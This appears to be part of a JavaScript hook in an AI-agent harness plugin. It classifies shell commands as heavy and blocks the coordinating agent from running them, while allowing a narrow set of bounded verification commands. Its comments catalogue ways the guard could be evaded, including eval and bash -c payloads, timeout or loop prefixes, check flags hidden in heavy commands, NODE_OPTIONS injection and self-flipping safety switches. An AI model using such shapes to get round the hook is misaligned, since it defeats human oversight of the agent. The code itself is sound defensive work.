  if (group === 'workflow' && sub === 'run') return true;
  if (GH_MUTATING_SUBCOMMANDS[group] && GH_MUTATING_SUBCOMMANDS[group].has(sub)) return true;
  if (group === 'api') {
    // The splitter cuts a segment AT a backtick, so a trailing `query=`\`cmd\``
    // looks empty here; any backtick in the whole command voids the read proof.
    if (isReadOnlyGhGraphql(tokens, ghIdx) && !(command || '').includes('`')) return false;
    // `gh api graphql` always POSTs: heavy unless proven a read above.
    if (tokens.slice(ghIdx + 2).some((t) => /^\/?graphql$/i.test(t))) return true;
    for (let i = ghIdx + 2; i < tokens.length; i++) {
      const t = tokens[i];
      if (t === '-f' || t === '-F' || t === '--field' || t === '--raw-field') return true;
      // Attached forms (-fk=v, -Fk=v, --field=k=v, --raw-field=k=v) and a
      // request body (--input f / --input=f) are data args, same as separated.
      if (/^-[fF]./.test(t) || /^--(field|raw-field|input)=/.test(t) || t === '--input') return true;
      if (t === '-X' || t === '--method') {
        if (GH_API_MUTATING_METHODS.has((tokens[i + 1] || '').toUpperCase())) return true;
      }
    }
  }
  return false;
}

// Per-segment checks that need tokenized/positional logic (not a plain regex
// substring match) — evaluated alongside LIGHT_EXCEPTIONS in isHeavySegment.
const LIGHT_EXCEPTION_FNS = [isSafeGitFetch, isSafeSqliteReadonly, isReadOnlyCloudInspect];

// isFlaggedInterpreterScript(segment) -> true when the segment is
// `python*|node <flag...> <script>.py|.js|.mjs|.cjs ...` — an interpreter
// invocation of a real script file with one or more interpreter FLAGS
// (dash-prefixed tokens, value-taking or not, e.g. `-i`, `-X importtime`,
// `--inspect`, `--env-file=.env`) sitting between the interpreter and the
// script. HEAVY_PATTERNS above only matches the flagless shape
// (`python3 x.py`) because it requires the script token to sit immediately
// after the interpreter; without this check a flag placed BEFORE the script
// (`python3 -i x.py`, `node --inspect x.js`) never classifies heavy at all,
// so the command exits ALLOW before the --check carve-out's
// isInterpreterScriptCheck ever runs to refuse it (that refusal is correct
// but unreachable). This function only WIDENS the heavy net to make sure the
// carve-out is reached; it does not by itself decide the carve-out's ALLOW.
function isFlaggedInterpreterScript(segment) {
  const tokens = segment.trim().split(/\s+/).filter(Boolean);
  if (tokens.length < 3) return false;
  if (!SCRIPT_CHECK_INTERPRETER_RE.test(tokens[0])) return false;
  if (!tokens[1].startsWith('-')) return false; // flagless shape: HEAVY_PATTERNS already covers it
  const ext = /^node$/.test(tokens[0]) ? /\.(?:js|mjs|cjs)$/i : /\.py$/i;
  for (let i = 1; i < tokens.length; i++) {
    if (ext.test(tokens[i])) return true;
  }
  return false;
}

// Evaluate one segment: heavy if (its effective verb is a HEAVY_VERB) OR (it
// matches a HEAVY_PATTERN) OR (it is a heavy git/gh invocation per the
// tokenized checks above), AND it is NOT itself a LIGHT_EXCEPTION. Light
// exceptions are checked PER SEGMENT so `git status && npm run build` blocks on
// the build segment instead of being exempted by the whole-string status match.
// `command` is the FULL original command string this segment came from —
// needed only by isSafeSqliteReadonly's pipe-into-stdin check; every other
// LIGHT_EXCEPTION_FNS entry ignores the extra argument.
// `timeout [-flags] <duration>` only bounds run time, so the anchored
// anti-hall CLI exemptions must still see the wrapped `node <dir>/devswarm.js
// roster` as the segment's own verb (field report: the `timeout N node ...
// roster | head` form blocked while the same line without `timeout` passed).
const TIMEOUT_PREFIX_RE = /^\s*timeout\s+(?:-[ks]\s+\S+\s+|-\S+\s+)*\d+[smhd]?\s+/;

// A shell control keyword that merely introduces the next command
// (`for t in a b; do <cmd>`, `then <cmd>`, `if <cmd>`) is not part of that
// command. The segment splitter leaves the keyword glued to the body, which
// defeated every start-anchored LIGHT_EXCEPTION (field report: a `for … do
// node …/devswarm.js send …; done` loop was blocked while the same single
// send passed). Strip it so the body is judged exactly as it would be alone;
// every OTHER body segment (`; npm test`) is still classified on its own.
const CONTROL_KEYWORD_PREFIX_RE = /^\s*(?:(?:do|then|else|if|while|until|!)\s+)+/;

function isHeavySegment(segment, command) {
  segment = segment.replace(CONTROL_KEYWORD_PREFIX_RE, '');
  const unwrapped = segment.replace(TIMEOUT_PREFIX_RE, '');
  for (const re of LIGHT_EXCEPTIONS) {
    if (re.test(segment) || re.test(unwrapped)) return false;
  }
  for (const fn of LIGHT_EXCEPTION_FNS) {
    if (fn(segment, command)) return false;
  }
  if (isSafeNodeEval(segment)) return false;
  if (isNodeDashEInvocation(segment)) return true;
  if (isHeavyGitSegment(segment)) return true;
  if (isHeavyGhSegment(segment, command)) return true;
  if (isFlaggedInterpreterScript(segment)) return true;
  const verb = effectiveVerb(segment);
  if (verb && HEAVY_VERBS.has(verb)) return true;
  // For PATTERN matching only, neutralize quoted string contents so a benign
  // command whose only heavy-looking text is inside a quoted DATA arg
  // (`echo "npm run build"`, `printf 'go test ./...'`) is NOT flagged. Real
  // unquoted heavy commands survive neutralization and still match.
  let forPatterns = neutralizeQuotedContents(segment);
  // Also blank the search-PATTERN operand of grep/sed/awk (PATTERN_FIRST_VERBS)
  // — a heavy word appearing inside a search pattern, quoted OR unquoted
  // (`grep deploy file`, `grep -n 'npm run build' f`), is DATA describing what
  // to search for, not a command to run. See blankPatternArgument().
  forPatterns = blankPatternArgument(forPatterns, verb);
  for (const re of HEAVY_PATTERNS) {
    if (re.test(forPatterns)) return true;
  }
  return false;
}

// extractSubstitutions() and SHELL_VERBS are imported from
// ./lib/shell-scan.js (shared with git-guard.js). extractSubstitutions finds
// nested command strings hidden inside a segment so they are evaluated too
// (the segment splitter treats $(...) / backticks as plain boundaries and
// never inspects their CONTENTS):
//   (a) command substitution: $( ... ) and ` ... ` -> the inner command text.
// It is heredoc-aware (mirrors splitSegments' handling): a QUOTED delimiter
// (<<'EOF', <<"EOF") means the body is INERT DATA in a real shell — no
// $(...)/backtick expansion inside it — so its body is skipped from this
// substitution scan entirely, never treated as executable content. Root
// cause (field report): without this, a backtick-quoted span appearing as
// ordinary prose inside a `<<'EOF'` message body (e.g. `` `pytest tests -k
// <codebase>` `` inside a devswarm.js send message) was extracted as a real
// command substitution and recursed into isHeavyCommand, misclassifying
// quoted DATA as an executed command (verb: pytest). An UNQUOTED delimiter
// (<<EOF) DOES expand $(...)/backticks in a real shell, so its body is
// intentionally NOT skipped — the scan falls through and continues over it
// normally, still catching substitutions inside.
//   (b) shell -c payloads (extractShellCPayload below): when the effective
//       verb is a SHELL_VERBS member and a -c flag is present, the QUOTED
//       argument after -c is itself command(s).
// Depth bounding is handled by the recursive caller below (isHeavyCommand).

// If a segment is `bash -c '<payload>'` (or sh/zsh/dash -c "..."), return the
// unquoted payload command string, else ''. Best-effort tokenization.
function extractShellCPayload(segment) {
  const verb = effectiveVerb(segment);
  if (!verb || !SHELL_VERBS.has(verb)) return '';
  // Tokenize respecting quotes so the payload (which contains spaces) stays whole.
  const tokens = [];
  let cur = ''; let q = ''; let any = false;
  const str = segment.trim();
  for (let i = 0; i < str.length; i++) {
    const c = str[i];
    if (q) { if (c === q) { q = ''; } else cur += c; any = true; continue; }
    if (c === "'" || c === '"') { q = c; any = true; continue; }
    if (/\s/.test(c)) { if (any) { tokens.push(cur); cur = ''; any = false; } continue; }
    cur += c; any = true;
  }
  if (any) tokens.push(cur);
  // Find the -c flag; the NEXT token is the command payload.
  for (let i = 0; i < tokens.length; i++) {
    const t = tokens[i];
    if (t === '-c' || t === '--command') {
      return i + 1 < tokens.length ? tokens[i + 1] : '';
    }
    // Bundled short flags like -lc / -xc also carry a payload in the next token.
    if (/^-[a-z]*c$/.test(t)) {
      return i + 1 < tokens.length ? tokens[i + 1] : '';
    }
  }
  return '';
}

// If a segment is `eval <payload>`, return the payload as a COMMAND string to be
// re-parsed (NOT treated as a quoted data literal). `eval` runs its argument(s)
// as a shell command, so heavy commands can hide behind it (`eval "npm test"`,
// `eval npm test`). We collect every token AFTER the `eval` verb, honoring quotes
// so a quoted multi-word payload (`eval "npm run build"`) stays a single command
// string, and join them with spaces. The quote delimiters are stripped so the
// payload is the COMMAND text itself — this is what makes `eval "npm test"` parse
// as `npm test` (heavy) rather than a benign quoted data arg. Returns '' if the
// effective verb is not `eval` or there is no payload. Best-effort tokenization,
// mirroring extractShellCPayload.
function extractEvalPayload(segment) {
  const verb = effectiveVerb(segment);
  if (verb !== 'eval') return '';
  // Tokenize respecting quotes; strip quote delimiters so the payload is raw cmd.
  const tokens = [];
  let cur = ''; let q = ''; let any = false;
  const str = segment.trim();
  for (let i = 0; i < str.length; i++) {
    const c = str[i];
    if (q) { if (c === q) { q = ''; } else cur += c; any = true; continue; }
    if (c === "'" || c === '"') { q = c; any = true; continue; }
    if (/\s/.test(c)) { if (any) { tokens.push(cur); cur = ''; any = false; } continue; }
    cur += c; any = true;
  }
  if (any) tokens.push(cur);
  // Drop everything up to and including the `eval` verb token (basename-aware:
  // a path like /usr/bin/eval still resolves to eval). Leading wrapper/assignment
  // prefixes are already accounted for because effectiveVerb confirmed `eval`.
  let idx = 0;
  while (idx < tokens.length && basename(tokens[idx]).toLowerCase() !== 'eval') idx++;
  idx++; // skip the eval token itself
  const payloadTokens = tokens.slice(idx).filter(t => t.length);
  return payloadTokens.join(' ');
}

// A command is heavy if ANY of its segments is heavy. This fixes the core bug:
// the old code only inspected the first verb of the whole unsegmented string and
// short-circuited LIGHT_EXCEPTIONS on the whole string, so `cd app && npm test`,
// `git status && npm run build`, and `FOO=1 docker build .` all bypassed.
//
// RECURSION: also evaluates commands hidden in command substitution `$(...)` /
// backticks and in `bash -c '...'` payloads, so `echo "$(npm run build)"` and
// `bash -c "npm run build"` are caught. Depth-bounded to avoid pathological input.
function isHeavyCommand(command, depth) {
  if (typeof command !== 'string' || !command.trim()) return false;
  const d = typeof depth === 'number' ? depth : 0;
  if (d === 0 && isWholeCommandReadOnlyForm(command)) return false;
  for (const seg of splitSegments(command)) {
    if (isHeavySegment(seg, command)) return true;
    if (d < 3) {
      // (b) shell -c payload: unwrap and evaluate as command(s).
      const payload = extractShellCPayload(seg);
      if (payload && isHeavyCommand(payload, d + 1)) return true;
      // (c) eval payload: unwrap eval's argument(s) and evaluate as command(s).
      const evalPayload = extractEvalPayload(seg);
      if (evalPayload && isHeavyCommand(evalPayload, d + 1)) return true;
    }
  }
  // (a) command substitution: scan the WHOLE command (substitutions can span
  // segment boundaries / quotes) and recurse into each captured inner command.
  if (d < 3) {
    for (const inner of extractSubstitutions(command)) {
      if (isHeavyCommand(inner, d + 1)) return true;
    }
  }
  return false;
}

// Produce a SAFE classification label for the block reason — describes WHY the
// command was flagged WITHOUT reflecting any arbitrary user/command text back into
// the model-visible reason (injection hygiene). Returns either a detected heavy
// verb drawn from the fixed HEAVY_VERBS allowlist, or a fixed category name.
// Every returned value is from a closed, code-defined set — never raw input.
function classifyHeavy(command, depth) {
  if (typeof command !== 'string' || !command.trim()) return null;
  const d = typeof depth === 'number' ? depth : 0;
  for (const seg of splitSegments(command)) {
    if (isHeavySegment(seg, command)) {
      if (isHeavyGhSegment(seg) || isGitPushSegment(seg) || isGitPullFetchSegment(seg)) return { kind: 'remote', label: 'state-changing remote operation' };
      const verb = effectiveVerb(seg);
      if (verb && HEAVY_VERBS.has(verb)) return { kind: 'verb', label: verb };
      return { kind: 'category', label: 'heavy-pattern' };
    }
    if (d < 3) {
      const payload = extractShellCPayload(seg);
      if (payload) {
        const inner = classifyHeavy(payload, d + 1);
        if (inner) return inner;
      }
      const evalPayload = extractEvalPayload(seg);
      if (evalPayload) {
        const inner = classifyHeavy(evalPayload, d + 1);
        if (inner) return inner;
      }
    }
  }
  if (d < 3) {
    for (const inner of extractSubstitutions(command)) {
      const c = classifyHeavy(inner, d + 1);
      if (c) return c;
    }
  }
  return null;
}

// ---------------------------------------------------------------------------
// "Narrow allow" read-only verification carve-out (owner-approved 2026-09-26,
// "Narrow allow"). Lets the COORDINATOR run a short, BOUNDED, single-target
// verification command inline (e.g. re-running one test file to verify a
// subagent's "done" claim — rule L) instead of delegating it, even though
// isHeavyCommand() would otherwise flag it. This is checked ONLY as a final
// override AFTER a command is already classified heavy (main() calls it
// right before building the block reason) — it never widens what counts as
// heavy, and it never touches subagent context (subagents already pass
// through everything). Gated by guards.allowReadOnlyVerify (default true).
//
// Reuses splitSegmentsDetailed/effectiveVerb/neutralizeQuotedContents/
// blankPatternArgument/HEAVY_VERBS/HEAVY_PATTERNS — no new parser (a
// recurring bug class here is a second/third hand-rolled segment splitter).
//
// ALL of these must hold, or the command stays blocked:
//   1. every segment is either the qualifying single-target check, a
//      PIPE-fed bounded-output sink (tail/head/grep -c/grep -m N/wc), or
//      trivially safe (cd/pwd/true) — a segment that is none of these
//      (including a second, different heavy command) disqualifies the WHOLE
//      line. This is what keeps `pytest -q x.py; npm test`,
//      `node --test $(ls tests)`, `ksh -c "..."`, and a `--check` hidden
//      inside an otherwise-heavy invocation (`npm run build --check`, still
//      classified heavy because npm IS a HEAVY_VERB) blocked.
//   2. the bounded sink must be reached via an actual `|` (checked against
//      splitSegmentsDetailed's own delimiter for the PRECEDING segment) —
//      `<check> ; tail` (sequential, not piped) does not count as bounded
//      output and disqualifies the line.
//   3. no write redirect (`>`, `>>`, `tee`) to a path outside the session
//      scratchpad or a tmp root, on ANY segment.
// ---------------------------------------------------------------------------

const VERIFY_CHECK_FLAG_RE = /(^|\s)--(?:check|dry-run|list)(?:=\S+)?(?=\s|$)/;
const VERIFY_SYNTAX_ONLY_COMPILERS = new Set(['c++', 'cc', 'gcc', 'clang', 'clang++', 'g++']);
const VERIFY_TRIVIAL_VERBS = new Set(['cd', 'pwd', 'true']);

// A --check/--dry-run/--list flag only counts when the segment is NOT
// otherwise already classified heavy (its own verb is not a HEAVY_VERB and
// it does not match a HEAVY_PATTERN on quote-neutralized text) — this is the
// specific fix for "hidden inside a heavy command": `npm run build --check`
// stays blocked (npm is a HEAVY_VERB) rather than being waved through just
// because it also carries a --check-shaped token. The flag itself is also
// checked on the QUOTE-NEUTRALIZED segment, so `git commit -m "deploy
// --check"` (a flag-shaped substring inside quoted DATA) does not qualify.
// Verbs that EXECUTE another command/program text: a --check flag riding on
// one of these checks nothing about the payload it runs (`sh -c "npm test"
// --check`, `node -e "...execSync('npm test')" --check`), so they never
// qualify for the generic check-flag rule. Matched against the leading
// wrapper words AND the effective verb (effectiveVerb skips exec/env/xargs/…).
const CHECK_FLAG_REFUSED_VERBS = new Set([
  'sh', 'bash', 'zsh', 'ksh', 'dash', 'fish', 'eval', 'exec', 'xargs', 'env',
  'nohup', 'time', 'command', 'builtin', 'node', 'perl', 'ruby', 'php', 'deno', 'bun',
]);
const CHECK_FLAG_INLINE_CODE_FLAG_RE = /(^|\s)(?:-[A-Za-z]*[ce]|--eval|--command)(?=[\s=]|$)/;
const VERIFY_CHECK_FLAG_RE_G = new RegExp(VERIFY_CHECK_FLAG_RE.source, 'g');

function leadsWithRefusedCheckVerb(segment) {
  const tokens = segment.trim().split(/\s+/).filter(Boolean);
  let idx = 0;
  while (idx < tokens.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[idx])) idx++;
  for (; idx < tokens.length; idx++) {
    const word = basename(tokens[idx]).toLowerCase().replace(/^['"]+|['"]+$/g, '');
    if (CHECK_FLAG_REFUSED_VERBS.has(word) || /^python[0-9.]*$/.test(word)) return true;
    if (!WRAPPERS.has(word) && !/^-/.test(word) && !/^\d+[smhd]?$/.test(word)) break;
  }
  const verb = effectiveVerb(segment);
  return !!verb && (CHECK_FLAG_REFUSED_VERBS.has(verb) || /^python[0-9.]*$/.test(verb));
}

function isGenericCheckFlagCommand(segment) {
  const verb = effectiveVerb(segment);
  if (verb && HEAVY_VERBS.has(verb)) return false;
  if (leadsWithRefusedCheckVerb(segment)) return false;
  if (CHECK_FLAG_INLINE_CODE_FLAG_RE.test(neutralizeQuotedContents(segment))) return false;
  // With the check flag(s) removed, the segment must not be heavy under the
  // FULL classifier (wrapper/-c/eval/substitution unwrapping included) — the
  // flag may only ever narrow a non-heavy command, never launder a heavy one.
  if (isHeavyCommand(segment.replace(VERIFY_CHECK_FLAG_RE_G, ' '))) return false;
  let forPatterns = neutralizeQuotedContents(segment);
  forPatterns = blankPatternArgument(forPatterns, verb);
  for (const re of HEAVY_PATTERNS) {
    if (re.test(forPatterns)) return false;
  }
  const neutralized = neutralizeQuotedContents(segment);
  return VERIFY_CHECK_FLAG_RE.test(' ' + neutralized + ' ');
}

// Interpreter + existing script FILE + check flag (0.112, setting
// guards.allowReadOnlyVerifyScripts, default true). The generic check-flag
// rule above refuses interpreter verbs outright because `python -c "…" --check`
// / `node -e "…" --check` hide a payload. A real script file is a different
// shape: `python3 tools/gen_contract.py --check | tail -5`. It qualifies ONLY
// when ALL hold:
//   - the segment STARTS with the interpreter itself (no env assignment —
//     NODE_OPTIONS/PYTHONSTARTUP can inject code — and no wrapper: sh/bash/
//     eval/exec/xargs/env/nice/… never lead here);
//   - the very next token is the script path: not `-`, not starting with `-`
//     (so no interpreter option at all), unquoted, no expansion/glob chars,
//     and it resolves (against the payload cwd) to an existing regular FILE;
//   - no inline-code flag ANYWHERE (-c/-e/-m/-p/-r and combined forms,
//     --eval/--command/--print/--require/--import/--loader), no stdin/heredoc
//     redirect (`<`), no `$`/backtick/process substitution;
//   - a --check/--dry-run/--list flag is present (quote-neutralized);
//   - the remaining arguments (script + interpreter swapped for `true`, check
//     flags removed) are non-heavy under the FULL classifier.
// Bounded output (a piped sink) and every-other-segment rules are enforced by
// isBoundedVerificationCommand exactly as for the other qualifying checks.
const SCRIPT_CHECK_INTERPRETER_RE = /^(?:python[0-9.]*|node|ruby|perl|php)$/;
const SCRIPT_CHECK_REFUSED_FLAG_RE =
  /(^|\s)(?:-[A-Za-z]*[cemprI]|--eval|--command|--print|--require|--import|--loader|--experimental-loader|--interactive)(?=[\s=]|$)/;

// isInsideAntiHallPlugin(realPath) -> true when realPath lies under THIS
// plugin's root (hooks/..) or under any ancestor directory whose
// .claude-plugin/plugin.json names "anti-hall" (a second install, a cache
// copy, a dev checkout). Every anti-hall copy ships that manifest, the Codex
// install included (it runs these same hooks from the same plugin dir).
// Fail-closed: an error reading a manifest that exists counts as anti-hall.
function isInsideAntiHallPlugin(realPath) {
  let ownRoot;
  try { ownRoot = fs.realpathSync(path.resolve(__dirname, '..')); } catch (_) { ownRoot = path.resolve(__dirname, '..'); }
  const relOwn = path.relative(ownRoot, realPath);
  if (relOwn && !relOwn.startsWith('..') && !path.isAbsolute(relOwn)) return true;
  let dir = path.dirname(realPath);
  for (let i = 0; i < 16; i++) {
    const manifest = path.join(dir, '.claude-plugin', 'plugin.json');
    if (fs.existsSync(manifest)) {
      try {
        if (String(JSON.parse(fs.readFileSync(manifest, 'utf8')).name) === 'anti-hall') return true;
      } catch (_) { return true; }
    }
    const parent = path.dirname(dir);
    if (parent === dir) break;
    dir = parent;
  }
  return false;
}

function isInterpreterScriptCheck(segment, ctx) {
  if (settingsGet('guards', 'allowReadOnlyVerifyScripts') === false) return false;
  const trimmed = segment.trim();
  const tokens = trimmed.split(/\s+/).filter(Boolean);
  if (tokens.length < 3) return false;
  if (ctx && ctx.cwdUnknown) return false; // a preceding `cd` we could not resolve: relative script path is unknowable
  const payload0 = ctx && ctx.payload;
  const base0 = (payload0 && typeof payload0.cwd === 'string' && payload0.cwd) || process.cwd();
  if (!SCRIPT_CHECK_INTERPRETER_RE.test(basename(tokens[0]).toLowerCase())) return false;
  // A path-qualified interpreter (`../venv/bin/python`, `.venv/bin/python3`) is
  // the same shape as the bare name: plain path chars only, and it must be an
  // existing regular file (a nonexistent path is not a checkable interpreter).
  if (tokens[0] !== basename(tokens[0])) {
    if (/[$`'"~*?[\]{}\\<>();&|]/.test(tokens[0])) return false;
    try { if (!fs.statSync(path.resolve(base0, tokens[0])).isFile()) return false; } catch (_) { return false; }
  }
  const script = tokens[1];
  if (script === '-' || script.startsWith('-')) return false;
  if (/[$`'"~*?[\]{}\\<>();&|]/.test(script)) return false;
  // Anywhere in the segment: no expansion, no stdin/heredoc, no inline code.
  if (/[$`\\]|<\(|>\(/.test(segment)) return false;
  const neutralized = neutralizeQuotedContents(segment);
  if (/</.test(neutralized)) return false;
  if (SCRIPT_CHECK_REFUSED_FLAG_RE.test(neutralized)) return false;
  if (!VERIFY_CHECK_FLAG_RE.test(' ' + neutralized + ' ')) return false;
  const base = base0;
  let realScript;
  try {
    // Joined WITHOUT lexical normalization, then realpath'd: the kernel resolves
    // `L/../x` through the symlink L, so path.resolve's textual `..` collapse
    // would point at a different file than the one that actually runs.
    const joined = path.isAbsolute(script) ? script : base.replace(/\/+$/, '') + '/' + script;
    realScript = fs.realpathSync.native(joined); // .native: libc realpath keeps `L/..` physical (JS realpathSync pre-normalizes `..`)
    if (!fs.statSync(realScript).isFile()) return false;
  } catch (_) { return false; }
  // Never a way to flip a safety switch or trust an allowlist from the main
  // thread: `--confirmed` anywhere refuses, and so does any anti-hall script
  // (this plugin's own root, or any other anti-hall install/checkout found by
  // walking up from the script's realpath).
  if (tokens.some((t) => t === '--confirmed' || t.startsWith('--confirmed='))) return false;
  if (isInsideAntiHallPlugin(realScript)) return false;
  const rest = trimmed.slice(trimmed.indexOf(script, tokens[0].length) + script.length);
  if (isHeavyCommand(('true ' + rest).replace(VERIFY_CHECK_FLAG_RE_G, ' '))) return false;
  return true;
}

function isSyntaxOnlyCompileCheck(segment) {
  const verb = effectiveVerb(segment);
  if (!verb || !VERIFY_SYNTAX_ONLY_COMPILERS.has(verb)) return false;
  return /(^|\s)-fsyntax-only(?=\s|$)/.test(segment);
}

// `python3 -m pytest -q <single file or file::test>` — the exact documented
// shape only: no globs, no directory target, no extra args past the one
// target token.
function isSinglePytestFileCheck(segment) {
  const m = segment.trim().match(/^python3\s+-m\s+pytest\s+-q\s+(\S+)$/);
  if (!m) return false;
  const target = m[1];
  if (/[*?\[\]]/.test(target)) return false;
  if (target.endsWith('/')) return false;
  return true;
}

// `node --test <one or two explicit test files>` — no globs, no dirs, no
// extra flags; each target must look like an explicit JS/TS test file.
function isBoundedNodeTestCheck(segment) {
  const tokens = segment.trim().split(/\s+/).filter(Boolean);
  if (tokens.length < 3 || tokens.length > 4) return false;
  if (basename(tokens[0]).toLowerCase() !== 'node') return false;
  if (tokens[1] !== '--test') return false;
  const files = tokens.slice(2);
  for (const f of files) {
    if (f.startsWith('-')) return false;
    if (/[*?\[\]]/.test(f)) return false;
    if (f.endsWith('/')) return false;
    if (!/\.(?:m?js|cjs|ts)$/i.test(f)) return false;
  }
  return true;
}

// `[npx] vitest run <1-2 explicit test files>` / `[npx] jest <1-2 explicit
// test files>` — the JS-runner twin of isBoundedNodeTestCheck: no flags, no
// globs, no directories, each target an explicit `*.test|spec.<js|ts…>` file.
// Full suites, watch mode, `--coverage` and any other flag stay heavy.
function isBoundedJsTestRunnerCheck(segment, ctx) {
  const tokens = segment.trim().split(/\s+/).filter(Boolean);
  let i = 0;
  if (tokens[i] === 'npx') i++;
  if (tokens[i] === 'vitest') { i++; if (tokens[i] !== 'run') return false; i++; }
  else if (tokens[i] === 'jest') i++;
  else return false;
  const files = tokens.slice(i);
  if (files.length < 1 || files.length > 2) return false;
  if (ctx && ctx.cwdUnknown) return false; // a preceding cd we could not resolve
  const payload = ctx && ctx.payload;
  const base = (payload && typeof payload.cwd === 'string' && payload.cwd) || process.cwd();
  // Each operand must be an EXISTING regular file whose basename is
  // `<stem>.test|spec.<ext>` - a bare `.test.ts` is a runner FILTER PATTERN
  // (matches many files), not a file.
  return files.every((f) => {
    if (f.startsWith('-') || /[*?\[\]$`\\]/.test(f)) return false;
    if (!/^.+\.(?:test|spec)\.[mc]?[jt]sx?$/i.test(basename(f))) return false;
    try { return fs.statSync(path.resolve(base, f)).isFile(); } catch (_) { return false; }
  });
}

function isCtestNameCheck(segment) {
  return /^ctest\s+-R\s+\S+$/.test(segment.trim());
}

// isScratchpadOrTmpPath(p, ctx) -> true when p (relative paths resolve
// against the payload cwd) lands strictly inside THIS session's own
// scratchpad (lib/scratchpad.js ownScratchpadDirs — computed from the
// payload's cwd + session_id + the process uid, never a name match) or a
// tmp root (tmpRoots: os.tmpdir(), /tmp, /private/tmp — the same set
// edit-guard uses; a hook child may not inherit TMPDIR). Both sides are realpath'd (nearest existing ancestor) BEFORE
// the containment test, so `…/scratchpad/../../etc/x` and a symlinked
// component pointing outside are both rejected — the old raw
// `/scratchpad/` substring test accepted any path merely containing it.
function isScratchpadOrTmpPath(p, ctx) {
  if (typeof p !== 'string' || !p) return false;
  const unquoted = p.replace(/^['"]|['"]$/g, '');
  if (!unquoted || /[$`~*?[\]{}]/.test(unquoted)) return false; // expansion/glob: unknowable target
  if (ctx && ctx.cwdUnknown && !path.isAbsolute(unquoted)) return false; // unresolved preceding `cd`
  const payload = ctx && ctx.payload;
  const base = (payload && typeof payload.cwd === 'string' && payload.cwd) || process.cwd();
  let abs;
  try { abs = path.resolve(base, unquoted); } catch (_) { return false; }
  const sp = require('./lib/scratchpad.js');
  // ctx.ownOnly: THIS session's scratchpad only, not the generic tmp roots.
  const roots = sp.ownScratchpadDirs(payload).concat(ctx && ctx.ownOnly ? [] : sp.tmpRoots());
  for (const root of roots) {
    if (sp.isInsideDir(abs, root)) return true;
  }
  return false;
}

// `git clone --depth 1 <https-url> <dest>` with dest inside this session's
// scratchpad or a tmp root — the only clone shape that qualifies. The
// local-path clone form is gone: a local "source" can be any path on disk
// (or an `ext::`/transport-ish token git interprets), so it never qualifies.
function isSafeScratchpadGitClone(segment, ctx) {
  const m = segment.trim().match(/^git\s+clone\s+--depth\s+1\s+(https:\/\/\S+)\s+(\S+)$/);
  if (!m) return false;
  return isScratchpadOrTmpPath(m[2], ctx);
}

function isQualifyingSingleTargetCheck(segment, ctx) {
  if (isSyntaxOnlyCompileCheck(segment)) return true;
  if (isSinglePytestFileCheck(segment)) return true;
  if (isBoundedNodeTestCheck(segment)) return true;
  if (isBoundedJsTestRunnerCheck(segment, ctx)) return true;
  if (isCtestNameCheck(segment)) return true;
  if (isSafeScratchpadGitClone(segment, ctx)) return true;
  if (isGenericCheckFlagCommand(segment)) return true;
  if (isInterpreterScriptCheck(segment, ctx)) return true;
  return false;
}

// isLooseSinkShape(segment) -> true iff the stage NAMES a sink-like command
// (tail/head/wc, or grep with -c / -m N somewhere). Shape only: it says nothing
// about operands or flags, so it never decides an allow by itself.
function isLooseSinkShape(segment) {
  const verb = effectiveVerb(segment);
  if (!verb) return false;
  if (verb === 'tail' || verb === 'head' || verb === 'wc') return true;
  if (verb === 'grep') {
    return /(^|\s)-c(?=\s|$)/.test(segment) || /(^|\s)-m\s*\d+(?=\s|$)/.test(segment);
  }
  return false;
}

// isBoundedSinkSegment(segment) -> true iff the stage is a sink-shaped command
// that ALSO satisfies the closed grammar (isClosedSinkStage): stdin-only, no
// file operand, no unknown flag. `head /etc/passwd` / `tail -n +1 --pid=1` are
// NOT sinks. `2>&1` only merges stderr into the pipe, so it is judged without it.
function isBoundedSinkSegment(segment) {
  if (!isLooseSinkShape(segment)) return false;
  // A leading `command ` (bypass an alias, e.g. a grep wrapper) is the one wrapper kept.
  return isClosedSinkStage(segment.replace(/(^|\s)2>&1(?=\s|$)/g, ' ').trim().replace(/^command\s+/, ''));
}

// isScratchFileSinkSegment(segment, ctx) -> true iff the stage is a closed sink
// whose only file operands are scratchpad/tmp paths (isScratchpadOrTmpPath). Used
// ONLY by the background scratch-script chain, whose documented remedy shape is
// `script > out; wc -l out; grep -c PAT out`: the sink reads the script's own
// output file, never an arbitrary path.
function isScratchFileSinkSegment(segment, ctx) {
  if (!isLooseSinkShape(segment)) return false;
  if (hasUnquotedRedirectChar(segment) || hasShellExpansionAnywhere(segment)) return false;
  const t = tokenizeQuoted(segment.trim().replace(/^command\s+/, ''));
  let end = t.length;
  // grep: exactly one trailing file operand (the token before it is the
  // pattern, never a path); wc/head/tail: any number of trailing operands.
  const maxStrip = t[0] === 'grep' ? 1 : t.length;
  for (let n = 0; n < maxStrip && end > 1 && !t[end - 1].startsWith('-') && isScratchpadOrTmpPath(t[end - 1], ctx); n++) end--;
  return closedSinkTokens(t.slice(0, end));
}

// Read-only FILTER stages that may sit between a qualifying check and its
// bounded sink (`vitest run f 2>&1 | grep -E "Tests|FAIL" | head -5`): the
// pipeline is bounded by its LAST stage, and these only transform stdin to
// stdout. Anything that can write a file or run a program (tee, xargs, sh,
// `sed -i`/`w`/`e`, `sort -o`, awk with system()/getline/redirects/pipes)
// is NOT a filter and keeps the pipeline blocked.
function isReadOnlyFilterSegment(segment) {
  const verb = effectiveVerb(segment);
  if (!verb) return false;
  const raw = segment.trim();
  // ANY unquoted output redirect (`>`, `>>`, `>|`, `&>`, `n>`, `>&n`) makes the
  // stage a writer, whatever the target (even a tmp/scratchpad path). Only the
  // stderr->pipe merge `2>&1` is harmless.
  if (/>/.test(neutralizeQuotedContents(raw).replace(/(^|\s)2>&1(?=\s|$)/g, ' '))) return false;
  const tokens = tokenizeQuoted(raw);
  const args = tokens.slice(1);
  if (verb === 'grep') return true;
  if (verb === 'cut' || verb === 'tr') return true;
  if (verb === 'sort') return !args.some((t) => /^(?:-[a-zA-Z]*o|--output|--compress-program)/.test(t));
  if (verb === 'uniq') return args.every((t) => t.startsWith('-')); // a positional is an OUTPUT file
  if (verb === 'sed') {
    if (!args.includes('-n')) return false;
    const rest = args.filter((t) => t !== '-n');
    return rest.length === 1 && /^(?:(?:\d+|\$)(?:,(?:\d+|\$))?|\/[^\/\\]+\/)p$/.test(rest[0]);
  }
  if (verb === 'awk') {
    if (args.some((t) => /^-f|^--file|^-i|^--include|^-e|^--source/.test(t))) return false;
    return !/system|getline|close|ENVIRON|fflush|[|>]/.test(raw);
  }
  return false;
}

// A segment that is NOT heavy by itself and does not open a subshell, a loop
